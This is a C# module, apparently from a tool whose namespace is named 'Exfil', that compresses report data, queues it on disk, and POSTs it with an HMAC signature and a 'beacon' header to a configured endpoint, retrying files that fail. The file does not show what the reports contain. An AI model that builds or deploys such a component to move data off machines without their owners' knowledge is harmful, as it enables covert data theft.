using System.IO.Compression;
using System.Net.Http.Headers;
using System.Security.Cryptography;
using System.Text;
using Teste.Core;

namespace Teste.Exfil;

public static class Uploader
{
    private static readonly HttpClient Http = new() { Timeout = TimeSpan.FromSeconds(45) };
    private static readonly string Queue = Path.Combine(
        Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), "Teste", "queue");

    public static void Send(Report r, Logger log)
    {
        Directory.CreateDirectory(Queue);
        foreach (var f in Directory.EnumerateFiles(Queue, "*.gz")) Flush(f, log);

        var tmp = Path.Combine(Queue, $"{r.RunId}.gz");
        File.WriteAllBytes(tmp, Gzip(r.ToJson()));
        Flush(tmp, log);
    }

    private static void Flush(string file, Logger log)
    {
        try
        {
            var body = File.ReadAllBytes(file);
            var stamp = DateTimeOffset.UtcNow.ToUnixTimeSeconds().ToString();

            using var content = new ByteArrayContent(body);
            content.Headers.Add("Content-Encoding", "gzip");
            content.Headers.ContentType = new MediaTypeHeaderValue("application/json");
            content.Headers.Add("X-Signature", Convert.ToHexString(
                HMACSHA256.HashData(Encoding.UTF8.GetBytes(Flags.Secret),
                    Encoding.UTF8.GetBytes(stamp + "." + Convert.ToHexString(SHA256.HashData(body)))))
                .ToLowerInvariant());

            using var req = new HttpRequestMessage(HttpMethod.Post, Flags.Endpoint) { Content = content };
            req.Headers.TryAddWithoutValidation("X-Beacon", Beacon.Read());
            req.Headers.TryAddWithoutValidation("X-Timestamp", stamp);

            var res = Http.Send(req);
            if (res.IsSuccessStatusCode) { File.Delete(file); log.Line($"[envio] ok {(int)res.StatusCode}"); }
            else log.Line($"[envio] {(int)res.StatusCode} — ficou na fila");
        }
        catch (Exception ex) { log.Line($"[envio] {ex.Message} — ficou na fila"); }
    }

    private static byte[] Gzip(string s)
    {
        using var ms = new MemoryStream();
        using (var g = new GZipStream(ms, CompressionLevel.SmallestSize)) g.Write(Encoding.UTF8.GetBytes(s));
        return ms.ToArray();
    }
}